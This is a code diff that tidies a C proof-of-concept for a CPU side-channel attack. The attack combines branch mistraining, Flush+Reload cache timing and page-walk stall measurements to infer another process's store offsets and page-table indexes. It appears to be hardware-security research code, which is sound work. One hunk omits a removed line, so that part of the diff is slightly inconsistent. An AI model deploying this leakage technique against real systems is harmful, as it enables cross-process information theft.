@@ -12,10 +12,17 @@
 static u32 threshold; // cache hit threshold
 static u8 *victim_page, *normal_page, *probe, *garbage; // some handy pages
 
+// assuming 4KB page and 4-level PT
+#define PAGE_SHIFT (12u)
+#define PAGE_SIZE (1u << PAGE_SHIFT)
+#define INDEX_WIDTH (9u)
+#define INDEX_COUNT (1u << INDEX_WIDTH)
+#define INDEX_MASK (INDEX_COUNT - 1)
+
 // allocate PRIVATE memory and initialize it
 static u8 *setup_page(size_t size, u8 init) {
-    u8 *page = mmap(NULL, size, PROT_READ | PROT_WRITE,
-                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    u8 *page = mmap(NULL /* addr */, size, PROT_READ | PROT_WRITE,
+                    MAP_PRIVATE | MAP_ANONYMOUS, -1 /* fd */, 0 /* offset */);
     if (page == MAP_FAILED) {
         return NULL;
     }
@@ -32,8 +39,8 @@ static void unmap(u8 *page, size_t size) {
 // get index for a given pointer and a level of page table
 // PGD (level 4) -> PUD (level 3) -> PMD (level 2) -> PTE (level 1)
 static u16 get_PL_index(void *ptr, u8 level) {
-    u64 page = ((uintptr_t)ptr >> 12);
-    return (page >> ((level - 1) * 9)) & 0x1ff;
+    u64 page = ((uintptr_t)ptr >> PAGE_SHIFT);
+    return (page >> ((level - 1) * INDEX_WIDTH)) & INDEX_MASK;
 }
 
 // we only need one bit of information to indicate if page walk stalls,
@@ -44,30 +51,29 @@ static u16 get_PL_index(void *ptr, u8 level) {
 // stall, since zero can be a default value used for some forwarding (e.g.,
 // Meltdown), so we use an array with two pages and access probe[1 * page_size].
 static void flush_probe() {
-    _clflush(probe + getpagesize());
+    _clflush(probe + PAGE_SIZE);
 }
 
 static bool check_probe() {
-    return _time_maccess(&probe[getpagesize()], 1) < threshold;
+    return _time_maccess(&probe[PAGE_SIZE], 1 /* byte */) < threshold;
 }
 // end of util functions
 
-// use the first (MISTRAIN_EPOCH - 1) to mistrain, then mispredict
-#define MISTRAIN_EPOCH 6
 static int __attribute__((noinline)) store_offset_recovery() {
     int ret = 0;
+    // use the first (MISTRAIN_EPOCH - 1) iters to mistrain, then mispredict
+    const u16 MISTRAIN_EPOCH = 6;
     const u32 MEASURES = 100;
-    const u32 page_size = getpagesize();
     static volatile u64 _size1 = 10, _size2 = 11,
                         _size3 = 12; // slow branch gadgets
 
     pid_t pid = fork();
     if (pid == 0) {
-        u16 offset = 0x888; // offset of the store
+        u16 offset = 0x888; // offset of the store, align to 8-byte
         while (true) {
             // normal_page is NOT shared, the child process will make a copy on
             // write
-            _mwrite(&normal_page[offset], 0xff);
+            _mwrite(&normal_page[offset], 0xff /* value to write */);
         }
     } else if (pid < 0) {
         fprintf(stderr, "Failed to fork.\n");
@@ -75,14 +81,14 @@ static int __attribute__((noinline)) store_offset_recovery() {
     }
 
     // allocate 512 pages to cover all possible PL1 (PTE) indexes
-    u8 *pages = setup_page((1 << 9) * page_size, 0x1);
+    u8 *pages = setup_page(INDEX_COUNT * PAGE_SIZE, 0x1 /* init value */);
     if (!pages) {
         ret = 3;
         goto mmap_fail;
     }
 
-    for (u32 disp = 0; disp < (1 << 9); disp++) {
-        u8 *ptr = pages + disp * page_size;
+    for (u32 disp = 0; disp < INDEX_COUNT; disp++) {
+        u8 *ptr = pages + disp * PAGE_SIZE;
         u32 counter = 0;
         for (size_t cnt = 1; cnt <= MEASURES * MISTRAIN_EPOCH; cnt++) {
             flush_probe(); // prepare F+R probe
@@ -104,7 +110,7 @@ static int __attribute__((noinline)) store_offset_recovery() {
             if ((tmp < _size1) & (tmp < _size2) & (tmp < _size3)) {
                 // on misprediction, arr points to probe if *ptr is NOT stalled,
                 // we can observe signals from probe[PAGE_SIZE]
-                _maccess(&arr[*ptr * page_size]);
+                _maccess(&arr[*ptr * PAGE_SIZE]);
             }
 
             // check if *ptr successfully returns 0x1 during misprediction
@@ -116,7 +122,7 @@ static int __attribute__((noinline)) store_offset_recovery() {
         printf("%#5x\t%3d\n", pte_offset, counter);
     }
 
-    unmap(pages, (1 << 9) * page_size);
+    unmap(pages, INDEX_COUNT * PAGE_SIZE);
 mmap_fail:
     kill(pid, SIGKILL);
     return ret;
@@ -125,12 +131,12 @@ mmap_fail:
 static int __attribute__((noinline)) load_page_recovery_throughput() {
     int ret;
     const u32 MEASURES = 100, REPEATS = 100000;
-    const u32 page_size = getpagesize();
 
     // a page with PL4_index = 0x87, PL3_index = 0x65,
     // PL2_index = 0x43, PL1_index = 0x21
-    u8 *page = mmap((void *)0x439948621000ull, page_size,
-                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    u8 *page = mmap((void *)0x439948621000ull /* addr */, PAGE_SIZE,
+                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
+                    -1 /* fd */, 0 /* offset */);
     if (page == MAP_FAILED) {
         return 1;
     }
@@ -142,15 +148,17 @@ static int __attribute__((noinline)) load_page_recovery_throughput() {
     fprintf(stderr, "\tPL1 index: %#x\n", get_PL_index(page, 1));
 
     // shared variable controls when to measure throughput in sender
-                             MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    volatile u8 *start =
+        mmap(NULL /* addr */, sizeof(u8), PROT_READ | PROT_WRITE,
+             MAP_SHARED | MAP_ANONYMOUS, -1 /* fd */, 0 /* offset */);
     // shared page to store throughput results
-    u64 *counts = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
-                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    u64 *counts = mmap(NULL /* addr */, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                       MAP_SHARED | MAP_ANONYMOUS, -1 /* fd */, 0 /* offset */);
     if (start == MAP_FAILED || counts == MAP_FAILED) {
         return 1;
     }
     *start = 0;
-    memset(counts, 0, page_size);
+    memset(counts, 0 /* init value */, PAGE_SIZE);
 
     pid_t pid = fork();
     if (pid == 0) {
@@ -169,7 +177,7 @@ static int __attribute__((noinline)) load_page_recovery_throughput() {
                 cnt += 1;
             }
             // save throughput results
-            counts[idx % 512] = cnt;
+            counts[idx % (PAGE_SIZE / sizeof(u64))] = cnt;
             idx++;
         }
     } else if (pid < 0) {
@@ -178,13 +186,14 @@ static int __attribute__((noinline)) load_page_recovery_throughput() {
     }
 
     // receiver
-    for (u32 disp = 0; disp < (1 << 9); disp++) {
-        u8 *ptr = victim_page + (disp << 3);
-        usleep(1000);
+    for (u32 disp = 0; disp < INDEX_COUNT; disp++) {
+        u8 *ptr = victim_page + (disp << 3); // align to 8-byte
+        usleep(1000 /* 1ms */);
         *start = 1; // start measurement in sender
         _lfence();
         for (u32 rept = 0; rept < REPEATS; rept++) {
-            _mwrite(ptr, 0xff); // attempt to stall page walks in sender
+            // attempt to stall page walks in sender
+            _mwrite(ptr, 0xff /* value to write */);
         }
         *start = 0; // end measurement
     }
@@ -194,21 +203,21 @@ static int __attribute__((noinline)) load_page_recovery_throughput() {
     }
 
     kill(pid, SIGKILL);
-    munmap(counts, page_size);
-    munmap((u8 *)start, page_size);
-    munmap(page, page_size);
+    munmap(counts, PAGE_SIZE);
+    munmap((u8 *)start, sizeof(u8));
+    munmap(page, PAGE_SIZE);
     return ret;
 }
 
 static int __attribute__((noinline)) load_page_recovery_contention() {
     int ret;
     const u32 MEASURES = 50, REPEATS = 100000;
-    const u32 page_size = getpagesize();
 
     // a page with PL4_index = 0x87, PL3_index = 0x65,
     // PL2_index = 0x43, PL1_index = 0x21
-    u8 *page = mmap((void *)0x439948621000ull, page_size,
-                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    u8 *page = mmap((void *)0x439948621000ull /* addr */, PAGE_SIZE,
+                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
+                    -1 /* fd */, 0 /* offset */);
     if (page == MAP_FAILED) {
         return 1;
     }
@@ -231,8 +240,8 @@ static int __attribute__((noinline)) load_page_recovery_contention() {
         return 2;
     }
 
-    for (u32 disp = 0; disp < (1 << 9); disp++) {
-        u8 *ptr = victim_page + (disp << 3);
+    for (u32 disp = 0; disp < INDEX_COUNT; disp++) {
+        u8 *ptr = victim_page + (disp << 3); // align to 8-byte
         u64 total_time = 0;
         // measure execution latency for MEASURES times
         // we should observe a smaller latency if our store stalls page walk
@@ -242,7 +251,7 @@ static int __attribute__((noinline)) load_page_recovery_contention() {
             _lfence();
             clock_gettime(CLOCK_MONOTONIC, &t_start);
             for (u32 rept = 0; rept < REPEATS; rept++) {
-                _mwrite(ptr, 0xff);
+                _mwrite(ptr, 0xff /* value to write */);
             }
             clock_gettime(CLOCK_MONOTONIC, &t_end);
             u64 nsec_diff = (t_end.tv_sec - t_start.tv_sec) * 1e9 +
@@ -253,7 +262,7 @@ static int __attribute__((noinline)) load_page_recovery_contention() {
     }
 
     kill(pid, SIGKILL);
-    munmap(page, page_size);
+    munmap(page, PAGE_SIZE);
     return ret;
 }
 
@@ -268,10 +277,10 @@ int main(int argc, char **argv) {
     threshold = _get_cache_hit_threshold();
     fprintf(stderr, "Cache Hit Threshold: %u\n", threshold);
 
-    victim_page = setup_page(getpagesize(), 0x1);
-    normal_page = setup_page(getpagesize(), 0x2);
-    probe = setup_page(getpagesize() * 2, 0x0);
-    garbage = setup_page(getpagesize() * 2, 0x0);
+    victim_page = setup_page(PAGE_SIZE, 0x1 /* init value */);
+    normal_page = setup_page(PAGE_SIZE, 0x2);
+    probe = setup_page(PAGE_SIZE * 2, 0x0);
+    garbage = setup_page(PAGE_SIZE * 2, 0x0);
     if (!victim_page || !normal_page || !probe || !garbage) {
         fprintf(stderr, "Failed to allocate pages.\n");
         ret = -2;
@@ -293,10 +302,10 @@ int main(int argc, char **argv) {
     }
 
 mmap_fail:
-    unmap(victim_page, getpagesize());
-    unmap(normal_page, getpagesize());
-    unmap(probe, getpagesize() * 2);
-    unmap(garbage, getpagesize() * 2);
+    unmap(victim_page, PAGE_SIZE);
+    unmap(normal_page, PAGE_SIZE);
+    unmap(probe, PAGE_SIZE * 2);
+    unmap(garbage, PAGE_SIZE * 2);
 segv_fail:
     ptedit_cleanup();
     return ret;
